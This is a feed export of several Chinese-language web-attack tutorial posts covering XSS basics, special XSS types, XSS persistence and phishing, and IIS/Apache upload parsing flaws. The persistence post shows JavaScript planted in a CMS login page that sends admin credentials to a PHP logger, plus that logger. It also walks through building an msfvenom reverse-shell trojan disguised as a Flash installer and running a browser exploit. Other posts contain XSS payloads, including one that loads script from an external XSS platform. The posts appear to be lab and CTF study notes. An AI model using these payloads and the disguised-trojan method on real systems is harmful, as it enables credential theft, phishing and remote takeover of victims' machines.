Policy)"></a>设置CSP(Content Security Policy)</h2><p>CSP配置代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy:img-src &#x27;self&#x27; &quot;</span>);<span class="comment">//只允许加载本地源图片</span></span><br></pre></td></tr></table></figure><p>当开启这个之后，只可以加载本地源图片，而不允许加载外来图片，具体文章参考以下这篇文章：<a href="https://blog.csdn.net/a1766855068/article/details/89370320">Web安全2.3：CSP安全策略、Cookie、Session、同源策略、HTML DOM树_同源策略与内容安全策略的区别-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> XSS跨站请求 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS绕过 </tag>
            
            <tag> XSS修复 </tag>
            
            <tag> http_only </tag>
            
            <tag> CSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞—XSS跨站之权限维持、钓鱼</title>
      <link href="/post/abd6100.html"/>
      <url>/post/abd6100.html</url>
      
        <content type="html"><![CDATA[<h1 id="XSS后台植入Cookie-amp-表单劫持"><a href="#XSS后台植入Cookie-amp-表单劫持" class="headerlink" title="XSS后台植入Cookie&amp;表单劫持"></a>XSS后台植入Cookie&amp;表单劫持</h1><p><strong>前提条件：已经取得了web权限，我们可以直接在代码中写入XSS语句</strong></p><p>有人可能会奇怪，为什么取得了web权限还要写入XSS，是因为我们要对后台的权限进行长期的控制（权限维持），我们可以通过借助XSS盗取cookie，利用xss平台实时监控cookie等凭据进行权限维持，即使修改后台登录账号密码，我们也可以获得相关权限，同时不会被后门工具识别。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807162936300.png" alt="image-20240807162936300"></p><p>当我们进入到页面后，我们可以在xss平台上接收到相关的cookie信息，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172504480-1816928231.png" alt="1645930438846-51b01966-10c6-48fe-a3b8-3b95087c9755.png"></p><p>但是，有时候我们窃取了cookie也不能实现成功登录，因为对方可能采取的不是cookie来进行身份鉴别，而是使用sessionid来实现身份鉴别，这时候即使你获取了cookie，也不能实现登录，这个时候我们就要想办法获取到其明文的账号和密码。</p><p>这里我们首先看看其将账号密码发送到哪个文件中，我们通过浏览器抓包可以发现，账号密码被送入<code>login_check.php</code>中</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172503193-259714763.png" alt="1645931769293-0668f567-0b99-4edc-9c95-e60cbea30cc5.png"></p><p>我们先随便输入一个账号密码，查看提交的数据，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172504016-1501658563.png" alt="1645932659164-9f516362-c71f-490a-97ce-8135adcc8153.png"></p><p>我们再次观察<code>login_check.php</code>，可以发现<code>login_check.php</code>通过<code>$metinfo_admin_name</code>接收账号，通过<code>$metinfo_admin_pass</code>接收密码，然后通过JavaScript语句进行账号密码的发送。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172505591-1439970201.png" alt="1645932798875-2d6dc940-faee-46e0-9ff3-acedf40c94f6.png"></p><p>我们如何进行表单的劫持呢？我们首先可以通过JavaScript语句将账号密码发送到别的地方，通过构造<code>&lt;script src=&quot;http://www.xiaodi8.com/get.php?user=&quot;账号&quot;&amp;pass&quot;密码&quot;&quot;&gt;&lt;/script&gt;</code>，紧接着我们写一个php文件实现接收账号密码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$up</span>=<span class="string">&#x27;&lt;script src=http://127.0.0.1:8081/web/get.php?user=&#x27;</span>.<span class="variable">$metinfo_admin_name</span>.<span class="string">&#x27;&amp;pass=&#x27;</span>.<span class="variable">$metinfo_admin_pass</span>.<span class="string">&#x27;&gt;&lt;/script&gt;&#x27;</span>; </span><br></pre></td></tr></table></figure><p>对应的get.php文件如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;newfile.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$u</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$p</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当别人进行成功登录后，就会进入index.php文件中，而这个文件的代码被我们添加了JavaScript代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="attr">http</span>:<span class="comment">//127.0.0.1:8081/web/get.php?user=&#x27;.$metinfo_admin_name.&#x27;&amp;pass=&#x27;.$metinfo_admin_pass.&#x27;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>会自动将信息发送到我们对应的php下进行接收，进而实现表单劫持</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807170006116.png" alt="image-20240807170006116"></p><h1 id="flash钓鱼配合MSF"><a href="#flash钓鱼配合MSF" class="headerlink" title="flash钓鱼配合MSF"></a>flash钓鱼配合MSF</h1><p>我们首先下载一个正常的flash，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807170459099.png" alt="image-20240807170459099"></p><p>我们再通过msf生成一个后门exe，相关代码如下所示</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.153.129 LPORT=1111 -f exe &gt; flash.exe</span><br></pre></td></tr></table></figure><p>其中<code>LHOST</code>为监听端ip地址，<code>LPORT</code>为监听端口</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807170856470.png" alt="image-20240807170856470"></p><p>我们将这个文件传输到我们的本机上来，记得关闭本机杀毒软件，因为我们没做免杀</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807171033289.png" alt="image-20240807171033289"></p><p>我们把两个文件进行捆绑，我们这里通过WinRAR进行两个文件的捆绑，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808145656225.png" alt="image-20240808145656225"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808145816899.png" alt="image-20240808145816899"></p><p>记得先勾选再改名，不然不会是以exe的形式存在的，接着选择高级-自解压选项，添加自解压路径：<code>C:\windows\temp</code></p><p><img src="C:/Users/31677/AppData/Roaming/Typora/typora-user-images/image-20240808150130383.png" alt="image-20240808150130383"></p><p>之后我们设置自解压后运行，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808150648956.png" alt="image-20240808150648956"></p><p>之后我们将模式设置为全部隐藏</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808150803655.png" alt="image-20240808150803655"></p><p>之后我们成功创建自解压文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808150846322.png" alt="image-20240808150846322"></p><p>接下来我们为了更逼真，我们决定将图标进行更换，这里我们使用资源编辑器<code>Restorator2018_Full_1793_FIX</code>进行修改</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808151554232.png" alt="image-20240808151554232"></p><p>我们紧接着将图片进行导出，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808151750896.png" alt="image-20240808151750896"></p><p>然后我们打开我们的<code>flash_install.exe</code>，然后将刚刚的图标导入进去，并且删除其原来的图标，然后保存即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808152631873.png" alt="image-20240808152631873"></p><p>但是不知道为什么，这里把图标替换了，但是没什么反应，但是确实已经被替换了，接下来我们利用一个视频链接，里面插入xss代码自动下载这个文件，就实现了和xss的互动，但是这里过于复杂，还需要进行钓鱼网页的制作，所以就不在此演示</p><p>接着我们开启监听，我们使用win7虚拟机作为受害靶机演示</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> lport 1111</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808153947849.png" alt="image-20240808153947849"></p><p>我们这里假设已经通过钓鱼软件下载到了相关文件，这里复制到虚拟机上来图标变了，可能是没刷新吧，我们这里直接运行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808154257010.png" alt="image-20240808154257010"></p><p>运行后我们可以发现，已经监听到了相关上钩主机</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808154518913.png" alt="image-20240808154518913"></p><p>我们shell进行获取权限，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240808154557666.png" alt="image-20240808154557666"></p><p>如果想要成功率更高一点，就需要我们学习免杀相关内容，防止杀毒软件识别病毒</p><h1 id="XSS-浏览网马配合MSF上线"><a href="#XSS-浏览网马配合MSF上线" class="headerlink" title="XSS-浏览网马配合MSF上线"></a>XSS-浏览网马配合MSF上线</h1><p><strong>前置条件：目标使用带有漏洞的浏览器，为IE11</strong>，漏洞编号为CVE-2019-1367和CVE-2020-1380</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line"><span class="built_in">set</span> allowpowershellprompt <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> target 1 run </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172504924-946401172.png" alt="1646028417415-aeab27a8-1859-40e9-acd7-2ca27853058a.png"></p><p>运行之后会生成一个网址，只要地址一被访问就会被触发，但是只针对Windows7系统</p><p>我们可以通过xss让其上线beef，再通过beef自动跳转到我们构造的网马地址，其一访问就会上线</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172505653-1084962839.png" alt="1646029504625-62dfdad0-9f6c-4568-915e-ea1cc7f69166.png"></p><p>成功完成测试，总之对于xss的利用方式有很多，需要我们自己去发散思维，多多尝试即可。</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> XSS跨站请求 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
            <tag> 表单劫持 </tag>
            
            <tag> 钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-XSS跨站之特殊类型XSS</title>
      <link href="/post/106d471e.html"/>
      <url>/post/106d471e.html</url>
      
        <content type="html"><![CDATA[<h1 id="MXSS"><a href="#MXSS" class="headerlink" title="MXSS"></a>MXSS</h1><p>MXSS，也称为变异性的XSS，简单来说，MXSS原本的Payload是无害的，并不会产生XSS，但是由于一些特殊的原因，如反编码等导致Payload发生变异进而导致XSS，遇见的几率很小，老版本的QQ曾经有这个漏洞，但是已经被修复了，所以这种类型的XSS的参考意义也不大，了解即可。</p><h1 id="UXSS"><a href="#UXSS" class="headerlink" title="UXSS"></a>UXSS</h1><p>UXSS是利用浏览器或者浏览器扩展漏洞来制造产生XSS并执行代码的一种攻击类型，这种类型的漏洞通常不是网站的问题，而是浏览器自身存在这个问题。</p><p>相关示例视频可以参考这个：<a href="https://www.bilibili.com/video/BV1fX4y1c7rX/">【转载】MICROSOFT EDGE uXSS POC CVE-2021-34506_哔哩哔哩_bilibili</a></p><p>我们的源代码如下所示：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">u</span>&gt;</span>行之在线测试 <span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">Políticas de Privacidade</span><br><span class="line">Usaremos seus dados pessoais para resolver disputas, solucionar problemas e aplicar nossos Termos e Condições de Uso.</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">Para prevenir abusos no app/site, o Badoo usa decisões automáticas e moderadores para bloquear contas, como parte de seu procedimento de moderação. Para isso, nós conferimos contas e mensagens para encontrar conteúdo que indicam quebra dos nossos Termos e Condições de Uso. Isso é feito através de uma</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">u</span>&gt;</span>OUR PAYLOAD IN TEXT FORM <span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span> </span><br><span class="line">//这里写Payload</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Políticas de Privacidade</span><br></pre></td></tr></table></figure><p>这种漏洞的触发条件是<strong>低版本的edge浏览器</strong>，版本号为低于<code>91.0.864.37</code>，我们可以构造相关网站，放在该浏览器下进行访问</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172231083-1755041919.png" alt="1645841074481-e507a7e0-e315-45f0-b01f-c31b797c2f58.png"></p><p>我们访问该网站，发现并没有进行弹窗，我们接着点击翻译，把他翻译成其他语言</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172230723-721355510.png" alt="1645841323974-0891141c-0820-4df7-b88f-7ee3d90fb063.png"></p><p>我们发现出现了弹窗，证明存在XSS漏洞，而且XSS的产生原因是浏览器的翻译插件没有对跨站代码进行过滤，导致XSS漏洞的产生</p><h1 id="FlashXSS"><a href="#FlashXSS" class="headerlink" title="FlashXSS"></a>FlashXSS</h1><p>swf是小动画等一些视频类的后缀，swf是可以播放视频的，至于播放哪个视频是会给其传递相关参数的。同时，其可以接受JavaScript代码，通过JS代码来控制加载swf文件进行控制swf的播放。</p><p>我们接下来介绍如何进行审计这种漏洞，首先，这种我们一般都可以拿到源代码，因为我们可以进行反编译查看其源代码，所以我们侧重讲如何通过白盒进行发现该漏洞。</p><p>首先找到该swf文件，然后进行反编译，反编译工具链接：<a href="https://github.com/jindrapetrik/jpexs-decompiler">https://github.com/jindrapetrik/jpexs-decompiler</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172230862-820786520.png" alt="1645844202476-f586084b-37f9-4b40-a056-d44563b9439a.png"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172231394-166397314.png" alt="1645844477504-0b43d031-bf04-406e-acaa-7bf452c9ab11.png"></p><p>我们主要看的部分就是里面的脚本代码，我们直接全局搜索<code>ExternalInterface.call</code>，因为这是swf和js进行通信的关键函数，在swf中，<code>ExternalInterface.call</code>函数调用JavaScript代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172230651-918011494.png" alt="1645845806189-45fabfb6-9f01-4917-a50d-825d5ce5f1ab.png"></p><p>这里的param2看着不像js代码，所以我们继续查找js代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807110836782.png" alt="image-20240807110836782"></p><p>我们继续追踪变量jQuery</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807110946759.png" alt="image-20240807110946759"></p><p><code>loaderinfo.parameters</code>这里其实是在将参数传递给swf。这里我们就可以构造<code>jQuery=alert(1))&#125;catch(e)&#123;&#125;//</code>进行插入xss代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912172232030-2109644030.png" alt="1645847778423-3502370b-eb65-43b8-92d7-6fcc99c010e1.png"></p><h1 id="PDFXSS"><a href="#PDFXSS" class="headerlink" title="PDFXSS"></a>PDFXSS</h1><p>PDFXSS就更简单了，我们可以将XSS代码插入在PDF中，然后使用浏览器访问这个PDF就会造成弹窗</p><p>我们首先需要用到迅捷PDF编辑器，下载链接：<a href="https://www.xunjiepdf.com/editor">迅捷PDF编辑器 - 多功能的PDF编辑软件 (xunjiepdf.com)</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807112057512.png" alt="image-20240807112057512"></p><p>接着我们选择文件属性选项，插入JavaScript属性</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807112306359.png" alt="image-20240807112306359"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807112409658.png" alt="image-20240807112409658"></p><p>至此我们的一个XSSPDF就做好了，接着我们保存用浏览器进行打开</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240807112703066.png" alt="image-20240807112703066"></p><p>成功触发XSS，当然我们也可以进行思维的发散，比如将其上传至腾讯文档等让人信任的链接，然后发送给别人进行访问，造成别人被xss攻击，当然，腾讯文档会对其进行过滤，如果没有过滤的话，就是腾讯文档有漏洞了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> XSS跨站请求 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MXSS </tag>
            
            <tag> UXSS </tag>
            
            <tag> FlashXSS </tag>
            
            <tag> PDFXSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-XSS跨站之基本概念</title>
      <link href="/post/d2cf6b55.html"/>
      <url>/post/d2cf6b55.html</url>
      
        <content type="html"><![CDATA[<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>指攻击者利用网站程序对用户的输入过滤不足，输入可以显示在页面上对其它用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或者处理不严谨的时候，浏览器就会直接执行用户注入的脚本。</p><p>XSS产生于前端的漏洞，常产生于：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">1.数据交互的地方</span><br><span class="line"><span class="code">get、post、headers</span></span><br><span class="line"><span class="code">反馈与浏览</span></span><br><span class="line"><span class="code">富文本编辑器</span></span><br><span class="line"><span class="code">各类标签插入和自定义</span></span><br><span class="line"><span class="code">2.数据输出的地方</span></span><br><span class="line"><span class="code">用户资料</span></span><br><span class="line"><span class="code">关键词、标签、说明</span></span><br><span class="line"><span class="code">文件上传</span></span><br></pre></td></tr></table></figure><h1 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>反射型xss又称为非持久型xss，需要欺骗用户去点击链接才能触达xss代码。一般容易出现在搜索页面，反射型xss大多数用来盗取用户的Cookie信息，由于是非持久性的xss，其危害满足条件也很苛刻，所以现实生活中一般很少有厂家接收这个漏洞。下图很好的概括了反射型xss的攻击流程</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912171834623-1375811154.png" alt="1645676066748-edae56e3-341d-43e8-aa5a-723282b9ba90.png"></p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>我们以一道CTF题目来演示什么是反射型xss以及什么是xss平台</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804155412316.png" alt="image-20240804155412316"></p><p>我们一进来就看就有空格过滤，我们先随便试一试，看看能不能进行简单的弹窗，我们先输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，观察有什么结果出现</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804155638757.png" alt="image-20240804155638757"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804155729399.png" alt="image-20240804155729399"></p><p>我们发现进行了弹窗，这也印证了此处存在xss漏洞，我们可以使用xss平台当作我们的恶意服务器进行信息的接收，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804160222639.png" alt="image-20240804160222639"></p><p>我们将这里面的script语句插入原来的框内，点击<code>submit</code>，然后将得到的url粘贴进<code>send url</code>中，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804160418648.png" alt="image-20240804160418648"></p><p>然后我们在我们的xss平台就可以接收到相关的信息，成功获得flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804160454620.png" alt="image-20240804160454620"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804160555228.png" alt="image-20240804160555228"></p><h1 id="存储型XSS攻击"><a href="#存储型XSS攻击" class="headerlink" title="存储型XSS攻击"></a>存储型XSS攻击</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>是持久型xss攻击，攻击代码会被存储进被害者数据库中，类似于留言板和评论的地方，攻击者将攻击代码xss植入留言板后，之后的人只要访问留言板就会受到攻击，其相关原理图如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912171834314-1421941740.png" alt="1645676102364-3d7c9835-2926-4b89-bbe1-2a7dc2830058.png"></p><h2 id="实例演示-1"><a href="#实例演示-1" class="headerlink" title="实例演示"></a>实例演示</h2><p>我们以ctfhub上的题目作为演示，如下所示，同样将刚刚的代码复制到第一个框中</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804161821710.png" alt="image-20240804161821710"></p><p>可以发现我们这里的url并不带有像反射型xss一样的后缀，说明这里是存储型xss，已经将恶意代码存储到服务器中去了，我们这里只需要访问该url即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804162402587.png" alt="image-20240804162402587"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804162947533.png" alt="image-20240804162947533"></p><p>同样可以获取flag</p><h1 id="DOM型XSS攻击"><a href="#DOM型XSS攻击" class="headerlink" title="DOM型XSS攻击"></a>DOM型XSS攻击</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>DOM型XSS比较特殊，是基于文档对象模型的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，它不经过后端，完全由前端代码组成，其产生代码如下所示</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">对传过来的数据进行接受赋值给str，str在进行接连地址，构造一个完整的地址。</span><br><span class="line">比如输入<span class="number">123</span>，然后点击，他的地址就会变成<span class="attr">http</span>:<span class="comment">//127.0.0.1:8081/web/mysql/123，这个值在&lt;a href=&quot;123&quot;&gt;what do you see?&lt;/a&gt;这里显示，那么就可以构造payload&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt; &#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="实例演示-2"><a href="#实例演示-2" class="headerlink" title="实例演示"></a>实例演示</h2><p>由于DOM类型全部发生在前端，所以我们可以先查看一下前端源码，看看能不能有什么特殊的启示，首先查看源码，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804164225860.png" alt="image-20240804164225860"></p><p>我们的script语句肯定不能被单引号闭合，否则被当作字符串进行执行，就达不到我们想要的效果了，这里我们先传进行一个srcipt语句，看看不做任何处理会发生什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804164536726.png" alt="image-20240804164536726"></p><p>被包含进去了，且页面没有任何变化，所以我们要闭合单引号、分号、<code>&lt;script&gt;</code>，所以输入<code>&#39;;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804165144773.png" alt="image-20240804165144773"></p><p>所以接下来输入<code>&#39;;&lt;/script&gt;&lt;sCRiPt sRC=//xss88.cc/er6&gt;&lt;/sCrIpT&gt;//</code>，之后在xss平台上查看即可</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> XSS跨站请求 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反射型XSS </tag>
            
            <tag> 存储型XSS </tag>
            
            <tag> DOM型XSS </tag>
            
            <tag> 跨站劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-文件上传之中间件解析、编辑器安全</title>
      <link href="/post/2819e325.html"/>
      <url>/post/2819e325.html</url>
      
        <content type="html"><![CDATA[<h1 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h1><p>解析漏洞原理介绍：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">1.当建立<span class="emphasis">*.asa、*</span>.asp格式的文件夹时，其目录下的任意文件都被IIS当作ASP文件进行解析</span><br><span class="line">2.当文件时<span class="emphasis">*.asp;1.jpg时，IIS6.0同样会将文件作为ASP文件进行解析，同时包括下面三种文件格式，也同样被当作asp文件进行执行</span></span><br><span class="line"><span class="emphasis">test.asa;1.jpg</span></span><br><span class="line"><span class="emphasis">test.cer;1.jpg</span></span><br><span class="line"><span class="emphasis">test.cdx;1.jpg</span></span><br></pre></td></tr></table></figure><p>我们以一个实例来进行演示，如下所示，当上传一个普通的文件的时候，我们发现保存的路径为<code>http://xxxxxxxx/xxxxxx.gif</code>，同时我们发现可疑值<code>filepath=/</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912171444085-671863753.png" alt="1645575239507-aa248cab-811e-4924-bf64-0e9867ea011b.png"></p><p>我们修改<code>filepath</code>的值，可以发现会进行地址拼接，所以我们可以利用这个点来进行构造asp解析文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803105948649.png" alt="image-20240803105948649"></p><p>我们将<code>filepath</code>的值修改为<code>x.asp;.</code>，再发包，会出现下面的情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803110135145.png" alt="image-20240803110135145"></p><p>此时我们成功触发asp的代码，IIS可以把其当作asp代码进行解析，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912171443162-1741469889.png" alt="1645576004256-c34d8a9f-a5fc-414b-9bfb-95b152b9e813.png"></p><p>当然我们也可以将<code>filepath</code>修改为<code>/x.asp/</code>，即构造一个asp目录，使得其目录内的文件全部被当作asp文件进行解析，但是这个要配合权限设置，即对方开启了创建目录的权限，否则无法利用这个漏洞</p><h1 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h1><h2 id="换行解析漏洞"><a href="#换行解析漏洞" class="headerlink" title="换行解析漏洞"></a>换行解析漏洞</h2><p>apache的换行解析漏洞的出现是由于apache在修复第一个后缀名解析漏洞的时候，使用正则表达式匹配后缀，在解析php时将xxx.php\x0A当作PHP后缀进行解析，导致绕过安全策略</p><h3 id="CVE-2017-15715漏洞复现"><a href="#CVE-2017-15715漏洞复现" class="headerlink" title="CVE-2017-15715漏洞复现"></a>CVE-2017-15715漏洞复现</h3><p>我们使用vulhub进行漏洞复现，在具有docker环境下的ubuntu或者kali进行搭建，搭建命令如下所示</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git 